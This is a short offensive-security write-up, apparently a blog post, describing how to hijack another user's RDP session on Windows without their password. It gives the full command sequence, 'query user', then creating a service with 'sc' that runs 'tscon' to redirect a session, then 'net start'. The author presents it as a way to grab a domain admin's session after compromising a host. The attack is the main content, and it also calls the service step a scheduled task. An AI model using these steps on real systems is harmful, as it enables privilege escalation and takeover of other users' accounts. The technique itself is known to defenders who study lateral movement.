# Passwordless RDP Session Hijacking



A privileged user, which can gain command execution with **NT AUTHORITY/SYSTEM** rights can hijack any currently logged in user's session, without any knowledge about his credentials.

The Terminal Services session can be in either connected or disconnected state to hijack it.



This is not a vulnerability according to microsoft it is a "feature" but what would we do if microsoft didnt have so many "features" am i right? :D

by abusing this "feature", we can manage to maybe grab the domain admin session. if it ever logged to the computer we compromised and forgot to turn off his session.



The funny thing about this vulnerability is, we don't need to use any tool we can do all of this using microsoft built in commands.

**Tested on every possible version of windows from 2003 onwards.**



example of hijacking user \(active or disconnected\)  on some remote sensitive server that i have no access to, and haven't even knew about it, this technique allows me to compromise that server in just few commands!

Everything has been tested in real world scenarios and works every single time :\).



#### Important thing to know:



* You must have **Full Control access permission - NT AUTHORITY/SYSTEM** on the target we are trying to hijack from
* if you do not specify a password in the **password** parameter ,and you try to log into any available session it will accept it!





#### So how is it done :



Basically once we have a shell on a target and we are **NT/AUTHORITY** we can run the folloing command to query for available sessions on the target 

```
query user 
```

once we run the command we should see what sessions we have :

```
C:\>query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 #administrator                             1  Disc              18/01/2018 2:20 PM
>ouruser            session-1          2  Active          .  18/01/2018 2:20 PM

C:\>
```

all we need right now is to trigger it we can just create a scheduled task to launch it :

```
sc create goodbye binpath= "cmd.exe /k tscon 1 /dest:session-1"

```

start the service : 

```
net start goodbye
```

once the service is up and running your session will be replaced with the administrator user that connected to the machine we are controlling without any password! 



there are severals ways to run it if u are inside a shell and it will be updated in the future.



Written by :

~~**~BufferOv3rride~**~~

